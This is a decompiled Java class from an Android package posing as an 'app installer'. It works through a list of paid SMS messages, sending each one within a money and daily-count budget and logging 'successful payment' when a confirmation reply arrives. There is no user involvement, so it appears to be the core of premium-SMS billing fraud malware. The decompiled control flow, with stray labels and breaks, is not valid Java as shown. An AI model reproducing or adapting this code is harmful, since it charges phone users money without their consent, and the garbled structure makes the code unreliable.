package com.soft.android.appinstaller.sms.internals;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.util.Log;
import com.soft.android.appinstaller.core.SmsInfo;
import com.soft.android.appinstaller.core.SmsInfo.SMS;
import com.soft.android.appinstaller.sms.BasicSMSSender;
import com.soft.android.appinstaller.sms.Limits;
import com.soft.android.appinstaller.sms.capi.SMSSenderEngine;

public class ConfirmableSMSSenderEngineImpl
  extends BasicSMSSender
  implements SMSSenderEngine
{
  private static final String CONFIRMABLE_SMS_LAST_RECEIVED_TIME = "receivedSMS.confirmable.lastTime";
  private static final String CONFIRMABLE_SMS_LAST_SENT_TIME = "sentSMS.confirmable.lastTime";
  private static final String tag = "ConfirmableSMSSenderEngineImpl";
  private Context context;
  private final SmsInfo data;
  Limits limits;
  private int nextID;
  private SmsInfo.SMS prev;
  private SharedPreferences settings;
  
  public ConfirmableSMSSenderEngineImpl(SmsInfo paramSmsInfo, SharedPreferences paramSharedPreferences, Context paramContext)
  {
    this.data = paramSmsInfo;
    this.settings = paramSharedPreferences;
    this.context = paramContext;
    Log.v("ConfirmableSMSSenderEngineImpl", "C-tor");
  }
  
  private boolean isLastSentSMSApproved()
  {
    return this.settings.getLong("receivedSMS.confirmable.lastTime", 0L) > this.settings.getLong("sentSMS.confirmable.lastTime", 0L);
  }
  
  private void updateLastSentTime()
  {
    SharedPreferences.Editor localEditor = this.settings.edit();
    localEditor.putLong("sentSMS.confirmable.lastTime", System.currentTimeMillis());
    localEditor.commit();
  }
  
  public void SendMessage(Context paramContext, SmsInfo.SMS paramSMS)
  {
    super.SendMessage(paramContext, paramSMS);
    updateLastSentTime();
    this.prev = paramSMS;
  }
  
  public boolean canSendMoreMessages()
  {
    while ((this.nextID < this.data.getConfirmableSmsCount()) && (this.data.getConfirmableSMS(this.nextID).getCost() > this.limits.expectedMoneyRest())) {
      this.nextID += 1;
    }
    int i;
    if (this.nextID < this.data.getConfirmableSmsCount())
    {
      i = 1;
      if (this.limits.dcSmsCountRest() <= 0) {
        break label94;
      }
    }
    label94:
    for (int j = 1;; j = 0)
    {
      if ((i == 0) || (j == 0)) {
        break label99;
      }
      return true;
      i = 0;
      break;
    }
    label99:
    return false;
  }
  
  public void init(Limits paramLimits)
  {
    this.limits = paramLimits;
    this.nextID = 0;
    this.prev = null;
  }
  
  public void sendOneMessage()
  {
    if (this.prev != null)
    {
      if (!isLastSentSMSApproved()) {
        break label33;
      }
      this.limits.registerSuccessfulPayment(this.prev);
    }
    while (!canSendMoreMessages())
    {
      return;
      label33:
      this.limits.registerFailedPaymend(this.prev);
    }
    SmsInfo.SMS localSMS = this.data.getConfirmableSMS(this.nextID);
    SendMessage(this.context, localSMS);
  }
}
